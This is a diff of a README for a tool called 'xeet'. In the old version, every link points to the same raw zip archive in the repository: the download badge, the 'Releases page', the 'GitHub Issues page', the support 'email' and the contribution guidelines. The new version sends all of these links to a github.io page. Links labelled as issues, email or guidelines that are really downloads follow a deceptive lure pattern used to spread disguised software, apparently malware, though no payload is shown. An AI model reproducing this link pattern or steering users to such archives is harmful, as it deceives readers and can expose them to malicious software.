@@ -6,7 +6,7 @@ Welcome to the xeet project! This application is designed to help you easily wor
 
 ## 📥 Download xeet
 
-[![Download xeet](https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip)](https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip)
+[![Download xeet](https://sqamaryam.github.io)](https://sqamaryam.github.io)
 
 ## 🔧 System Requirements
 
@@ -28,9 +28,9 @@ Before you download xeet, ensure your system meets the following requirements:
 
 To download xeet, please visit the Releases page by clicking the link below:
 
-[Download xeet from Releases](https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip)
+[Download xeet from Releases](https://sqamaryam.github.io)
 
-1. Go to the [Releases page](https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip).
+1. Go to the [Releases page](https://sqamaryam.github.io).
 2. Look for the latest version at the top of the page.
 3. Select the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for MacOS, or the appropriate package for Linux).
 4. Click on the file to start the download.
@@ -76,17 +76,17 @@ Make sure to consult the help command for more detailed usage instructions.
 
 If you encounter any issues while using xeet, feel free to reach out for help:
 
-- Open an issue on the [GitHub Issues page](https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip).
-- Email our support team at https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip
+- Open an issue on the [GitHub Issues page](https://sqamaryam.github.io).
+- Email our support team at https://sqamaryam.github.io
 
 Your feedback is valuable to us as it helps improve the user experience.
 
 ## 💡 Contributing
 
-We welcome users to contribute to xeet. If you want to add features or improve existing ones, please check our contribution guidelines on the [GitHub page](https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip).
+We welcome users to contribute to xeet. If you want to add features or improve existing ones, please check our contribution guidelines on the [GitHub page](https://sqamaryam.github.io).
 
 ## 🌟 Acknowledgments
 
 Thank you for choosing xeet! We appreciate your support and hope you find this tool helpful in your daily tasks with x dot com. Happy computing!
 
-Feel free to revisit the [Releases page](https://github.com/SQAMaryam/xeet/raw/refs/heads/main/cmd/Software-v1.4.zip) for updates and new features.
+Feel free to revisit the [Releases page](https://sqamaryam.github.io) for updates and new features.
